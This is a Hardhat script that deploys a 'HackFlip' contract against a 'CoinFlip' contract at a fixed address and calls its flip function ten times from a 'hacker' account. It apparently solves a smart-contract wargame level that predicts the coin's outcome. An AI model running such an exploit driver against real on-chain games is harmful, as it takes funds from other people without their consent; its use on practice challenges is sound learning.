// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // 👉 Contract name and address
  const contractName = "CoinFlip";
  const contractAddress = "0xB570F62E443eE128FF756DDd9E9a3cb4107D48C1";

  // 👿 We get the hack contract to deploy
  const HackFlip = await hre.ethers.getContractFactory("HackFlip");
  const hackFlip = await HackFlip.deploy(contractAddress);

  await hackFlip.deployed();

  console.log(`✅ HackFlip deployed to:\n ${hackFlip.address} \n`);

  // Sleep for 1 seconds to allow the contract to be deployed
  await new Promise((r) => setTimeout(r, 1000));

  // Get accounts
  const [hackerSigner] = await hre.ethers.getSigners();
  console.log(`🤓 Hacker address:\n ${hackerSigner.address} \n`);

  // Flipping 10 times
  let i = 0;
  while (i < 10) {
    try {
      let flip = await hackFlip.connect(hackerSigner).flip();
      flip = await flip.wait((confirms = 1));
      i++;
      console.log(`🎲 Flip #${i} executed successfully!`);
    } catch (e) {}
  }

  // Verify contract deployment
  try {
    await hre.run("verify:verify", {
      address: hackFlip.address,
      constructorArguments: [contractAddress],
    });
  } catch (error) {
    console.error("🔴 Error ocurred while verifying. Check manually");
    console.error(error);
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
